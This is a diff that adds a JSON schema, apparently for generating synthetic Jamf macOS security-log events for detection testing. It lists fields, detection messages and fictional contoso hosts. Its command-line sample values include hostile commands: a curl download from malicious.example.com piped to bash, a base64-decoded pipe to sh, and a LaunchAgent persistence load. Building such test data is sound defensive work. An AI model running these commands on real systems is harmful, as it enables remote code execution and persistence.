@@ -1,0 +1,30 @@
+{
+  "columns": [
+    { "name": "TimeGenerated", "type": "datetime" },
+    { "name": "EventVendor", "type": "string", "values": ["Jamf"] },
+    { "name": "EventProduct", "type": "string", "values": ["Unified Log Stream"] },
+    { "name": "EventProductVersion", "type": "string", "values": ["5.0.0","5.1.0","5.2.0"] },
+    { "name": "EventSeverity", "type": "string", "values": ["Informational","Low","Medium","High"] },
+    { "name": "EventResult", "type": "string", "values": ["Allowed","Prevented"] },
+    { "name": "EventType", "type": "string", "values": ["UnifiedLog"] },
+    { "name": "EventMessage", "type": "string", "values": ["XProtect signature match","Suspicious AppleScript invocation","Unsigned binary execution","USB mass storage attached","Gatekeeper bypass attempt","Persistence via LaunchAgent","Keylogger registration detected","Process injection observed","Browser data access","TCC database access"] },
+    { "name": "EventResultMessage", "type": "string", "values": ["XProtect blocked known malware signature","AppleScript used to run shell commands","Unsigned binary attempted to execute","USB storage device was connected","Gatekeeper check failed for quarantined file","LaunchAgent plist written to persistence path","Suspicious keylogger API registration detected","Code injection via task_for_pid observed","Application accessed sensitive browser data","TCC-protected database accessed without consent"] },
+    { "name": "EventOriginalType", "type": "string", "values": ["GPUnifiedLogEvent"] },
+    { "name": "EventOriginalUid", "type": "string" },
+    { "name": "DvcHostname", "type": "string", "values": ["jdoe-mbp.contoso.local","asmith-macstudio.contoso.local","finance-imac-01.contoso.local","dev-mbp-eng-01.contoso.local","ceo-mbp.contoso.local","vip-mbp-legal.contoso.local"] },
+    { "name": "DvcSerial", "type": "string", "values": ["C02XF1JLJG5J","C02ZN1ABCDEF","C02G1234XYZ9","C02DK4567ABC"] },
+    { "name": "DvcIpAddr", "type": "string", "values": ["10.4.2.18","10.4.2.39","10.6.1.10","192.168.1.42"] },
+    { "name": "DvcId", "type": "string" },
+    { "name": "DvcOs", "type": "string", "values": ["macOS"] },
+    { "name": "DvcOsVersion", "type": "string", "values": ["macOS 13.6.1","macOS 14.2","macOS 14.4.1","macOS 15.0","macOS 15.1"] },
+    { "name": "SrcDeviceType", "type": "string", "values": ["Computer"] },
+    { "name": "TargetHostname", "type": "string", "values": ["jdoe-mbp.contoso.local","asmith-macstudio.contoso.local","finance-imac-01.contoso.local","dev-mbp-eng-01.contoso.local","ceo-mbp.contoso.local"] },
+    { "name": "ProcessEventType", "type": "string", "values": ["Create"] },
+    { "name": "ProcessEventSubType", "type": "string", "values": ["Exec"] },
+    { "name": "TargetProcessName", "type": "string", "values": ["osascript","python3","curl","bash","zsh","sh","launchd","sudo","ssh","node","ruby","Terminal","loginwindow","mdmclient"] },
+    { "name": "TargetProcessId", "type": "int" },
+    { "name": "TargetProcessGuid", "type": "string" },
+    { "name": "TargetProcessCommandLine", "type": "string", "values": ["osascript -e 'do shell script \"whoami\"'","curl -fsSL http://malicious.example.com/payload.sh | bash","python3 -c 'import os; os.system(\"id\")'","bash -c 'echo dGVzdA== | base64 -d | sh'","sh /tmp/payload.sh","sudo launchctl load /Library/LaunchAgents/com.evil.plist"] },
+    { "name": "TargetProcessCurrentDirectory", "type": "string", "values": ["/usr/bin","/usr/local/bin","/tmp","/var/folders/zz","/Applications/Microsoft Word.app/Contents/MacOS","/Users/jdoe/Downloads"] }
+  ]
+}
